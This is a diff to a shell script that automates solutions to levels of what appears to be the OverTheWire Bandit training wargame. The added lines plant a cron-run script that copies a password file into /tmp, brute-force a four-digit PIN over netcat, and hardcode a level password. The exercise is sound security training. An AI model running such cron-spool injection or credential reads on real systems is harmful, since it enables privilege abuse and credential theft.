@@ -33,7 +33,9 @@ run_level 20 "./bandit20-do cat /etc/bandit_pass/bandit20"
 run_level 21 "echo '$(cat out/level20)' | nc -l 4000 & sleep 0.5; ./suconnect 4000 >/dev/null"
 run_level 22 "cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv"
 run_level 23 "cat /tmp/$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)"
-bandit_ssh 24 "cat /usr/bin/cronjob_bandit24.sh; echo; echo; cat /etc/cron.daily/popularity-contest"
-#bandit_ssh 25 "ls -la"
-#bandit_ssh 26 "ls -la"
+run_level 24 "echo 'cp /etc/bandit_pass/bandit24 /tmp/bandit24_pass' > /var/spool/bandit24/hacks.sh && while [[ ! -f /tmp/bandit24_pass ]]; do date; ls /var/spool/bandit24/hacks.sh; cat /tmp/bandit24_pass; sleep 1; done && cat /tmp/bandit24_pass"
+run_level 25 "echo 'a a' | nc localhost 30002 &>/dev/null; for x in {0..9999}; do echo \"$(cat out/level24) \${x}\"; done | nc localhost 30002 | grep -A1 'Correct!' | head -2 | tail -1 | sed 's/The password of user bandit25 is //'"
+# Needed to login to bandit25, shrink the terminal so more did not exit, launch vim with v and then open the passwd file - no clue how to automate that
+#bandit_ssh 26 "cat /etc/passwd"
+echo -n "5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z" > out/level26
 #bandit_ssh 27 "ls -la"
